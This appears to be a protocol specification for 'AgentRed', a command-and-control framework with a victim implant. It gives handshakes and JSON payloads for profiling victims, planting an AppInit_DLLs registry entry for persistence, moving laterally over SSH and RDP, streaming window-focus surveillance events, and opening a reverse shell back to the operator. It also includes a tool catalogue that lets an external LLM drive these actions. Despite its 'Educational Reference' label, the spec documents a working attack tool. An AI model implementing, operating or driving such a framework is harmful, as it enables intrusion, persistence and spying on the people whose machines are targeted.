# AgentRed: Wire Protocol & API Specification

> **Educational Reference**: This document defines the wire framing, authentication handshakes, module command payloads, event streaming mechanisms, and out-of-band reverse shell protocols used across AgentRed.

---

## 1. Framing & Transport Layer

### 1.1 TCP Stream & Framing
- **Transport**: Standard TCP (optional TLS via `--certfile` and `--keyfile`).
- **Default Port**: `4444` (C2 relay stream).
- **Framing**: Newline-delimited UTF-8 JSON. Every message is terminated by `\n` (`0x0A`).
- **Buffers**: Handlers read chunks up to 4096 bytes and split on `\n`. Messages can span multiple chunks.

### 1.2 State Machine & Roles

```
[TCP Connect] ──▶ [Unauthenticated State]
                        │
                        ├─{"token":"...", "role":"operator"} ──▶ [Operator Session]
                        │                                          - Submits module commands
                        │                                          - Receives push event stream
                        │
                        └─{"token":"...", "role":"agent"}    ──▶ [Agent Session]
                                                                   - Receives forwarded commands
                                                                   - Emits push events
```

---

## 2. Authentication Handshake

Immediately upon establishing a TCP connection, the client (operator or victim implant) MUST send an authentication object as its first line.

### Operator Handshake
```json
{"token": "<C2_AUTH_TOKEN>", "role": "operator"}
```
*Note: If `"role"` is omitted, `"operator"` is assumed by default.*

**Server Success Response**:
```json
{"status": "ok", "message": "Authenticated as operator"}
```

### Agent (Victim Implant) Handshake
```json
{"token": "<C2_AUTH_TOKEN>", "role": "agent"}
```

**Server Success Response**:
```json
{"status": "ok", "message": "Authenticated as agent"}
```

### Authentication Failure Response
```json
{"status": "error", "message": "Authentication failed"}
```
*(The server immediately terminates the TCP connection following an auth error.)*

---

## 3. Command & Response Schemas

Once authenticated, operators submit module requests formatted as:
```json
{
  "module": "<module_name>",
  "payload": {
    "action": "<action_name>",
    ...
  }
}
```

The C2 relay handles local modules ([`activity_module.py`](file:///Users/matanmishali/AntiGravity/AgentRed/c2_server/modules/activity_module.py), [`rdp_module.py`](file:///Users/matanmishali/AntiGravity/AgentRed/c2_server/modules/rdp_module.py), [`registry_module.py`](file:///Users/matanmishali/AntiGravity/AgentRed/c2_server/modules/registry_module.py), [`ssh_module.py`](file:///Users/matanmishali/AntiGravity/AgentRed/c2_server/modules/ssh_module.py)) or forwards victim-targeted commands to the connected DLL implant.

---

### 3.1 Module: `activity`
Handles system profiling, process inspection, resource monitoring, and network connection auditing.

#### Actions:
- **`sysinfo`**: Queries OS build, architecture, hostname, and uptime.
  - *Response*: `{"status": "ok", "os": "Windows 10 Pro", "build": 19045, "arch": "x64", "computer": "TARGET-PC", "uptime_sec": 84210}`
- **`processes`**: Returns the complete process table via `Toolhelp32`.
  - *Response*: `{"status": "ok", "processes": [{"pid": 4, "name": "System", "threads": 180}, {"pid": 640, "name": "lsass.exe", "threads": 8}]}`
- **`top_cpu` / `top_mem`**: Profiles resource utilization.
  - *Payload*: `{"action": "top_cpu", "n": 5}`
  - *Response*: `{"status": "ok", "top": [{"pid": 1120, "name": "chrome.exe", "cpu_percent": 18.4}]}`
- **`network`**: Returns active TCP listening and established connections via `GetExtendedTcpTable`.
  - *Response*: `{"status": "ok", "connections": [{"proto": "TCP", "local": "192.168.1.50:49210", "remote": "10.0.0.1:4444", "state": "ESTABLISHED"}]}`
- **`monitor_start` / `monitor_stop` / `monitor_get`**: Background CPU and memory threshold monitoring.

---

### 3.2 Module: `registry`
Interacts with the Windows Registry (`winreg` API).

#### Actions:
- **`read`**:
  - *Payload*: `{"action": "read", "root": "HKLM", "path": "SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion", "key": "ProductName"}`
  - *Response*: `{"status": "ok", "type": "REG_SZ", "value": "Windows 10 Pro"}`
- **`write`**:
  - *Payload*: `{"action": "write", "root": "HKLM", "path": "SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Windows", "key": "AppInit_DLLs", "value": "C:\\Users\\Victim\\AppInit_DLLs.dll", "type": "REG_SZ"}`
  - *Response*: `{"status": "ok"}`
- **`list_keys` / `list_values`**: Enumerates subkeys and values under a path.
- **`delete_val` / `delete_key`**: Removes registry entries.

---

### 3.3 Module: `ssh`
Client-side SSH capability in the implant (via `libssh2`) or server-side (via `paramiko`).

#### Actions:
- **`connect`**:
  - *Payload*: `{"action": "connect", "host": "192.168.1.100", "port": 22, "username": "admin", "password": "Password123"}`
  - *Response*: `{"status": "ok", "session_id": 1}`
- **`exec`**:
  - *Payload*: `{"action": "exec", "session_id": 1, "cmd": "uname -a"}`
  - *Response*: `{"status": "ok", "stdout": "Linux target 5.15.0-x86_64 ...", "stderr": ""}`
- **`close` / `list`**: Manages active SSH sessions.

---

### 3.4 Module: `rdp`
Inspects local RDP configuration and initiates remote connections via `mstsc.exe`.

#### Actions:
- **`probe`**:
  - *Payload*: `{"action": "probe", "target": "192.168.1.105"}`
  - *Response*: `{"status": "ok", "target": "192.168.1.105", "port": 3389, "open": true}`
- **`open`**:
  - *Payload*: `{"action": "open", "target": "192.168.1.105", "user": "admin", "domain": "CORP"}`
  - *Response*: `{"status": "ok", "session_id": 1, "target": "192.168.1.105"}`

---

### 3.5 Module: `notify`
Triggers desktop UI notifications and controls event streaming.

#### Actions:
- **`popup`**: Displays a Windows MessageBox dialog on the victim screen.
  - *Payload*: `{"action": "popup", "title": "System Alert", "text": "Scheduled update in progress.", "style": "warning"}`
  - *Response*: `{"status": "ok", "clicked": "OK"}`
- **`balloon`**: Shows a shell tray notification balloon.
- **`start` / `stop` / `status`**: Toggles foreground window hook streaming.

---

## 4. Push Event Telemetry Protocol

Push events originate from the victim agent and are broadcasted by the server to all authenticated operators without request/response locking.

### Event Format:
```json
{
  "event": "window_focus",
  "timestamp": 1773176500,
  "process": "chrome.exe",
  "title": "Corporate Intranet - Sign In",
  "hwnd": 131248
}
```

```json
{
  "event": "notification_seen",
  "timestamp": 1773176550,
  "title": "USB Device Detected",
  "message": "Kingston DataTraveler 3.0 inserted"
}
```

---

## 5. Out-of-Band Direct Reverse Shell Protocol

To support interactive command-line operations without JSON encapsulation delays, the shell channel operates out-of-band:

```
Step 1: Operator opens listener on port 4445
Step 2: Operator dispatches JSON instruction to agent:
        {"module": "shell", "payload": {"action": "open", "host": "<operator_ip>", "port": 4445}}
Step 3: Agent connects direct raw TCP to <operator_ip>:4445
Step 4: Standard duplex streaming (raw bytes, vt100 / cmd.exe stream)
```
- The stream passes directly between the victim socket and the operator terminal.
- Disconnecting the shell does not disrupt the primary C2 JSON stream on port `4444`.

---

## 6. FastMCP Tool Catalog Reference

When integrating with external LLMs via [`c2_server/mcp/c2_project_mcp.py`](file:///Users/matanmishali/AntiGravity/AgentRed/c2_server/mcp/c2_project_mcp.py), all capabilities are mapped to standardized tools:

| MCP Tool Name | Target Module | Description | Mutating? |
| :--- | :--- | :--- | :--- |
| `sysinfo` | `activity:sysinfo` | Query OS, build, hostname, uptime | No |
| `processes` | `activity:processes` | List all running processes | No |
| `top_cpu` | `activity:top_cpu` | Get top processes by CPU | No |
| `top_mem` | `activity:top_mem` | Get top processes by memory | No |
| `network` | `activity:network` | Get active TCP network connections | No |
| `reg_read` | `registry:read` | Read a Windows registry value | No |
| `reg_list_keys` | `registry:list_keys` | List subkeys of a registry path | No |
| `reg_write` | `registry:write` | Write or create a registry value | **Yes** |
| `reg_delete_val`| `registry:delete_val` | Delete a registry value | **Yes** |
| `ssh_connect` | `ssh:connect` | Open an SSH connection | **Yes** |
| `ssh_exec` | `ssh:exec` | Run a remote command via SSH | **Yes** |
| `rdp_open` | `rdp:open` | Launch an RDP connection session | **Yes** |
| `shell_open` | `shell:open` | Spawn a direct interactive reverse shell | **Yes** |
| `notify_popup` | `notify:popup` | Display a desktop dialog box | **Yes** |
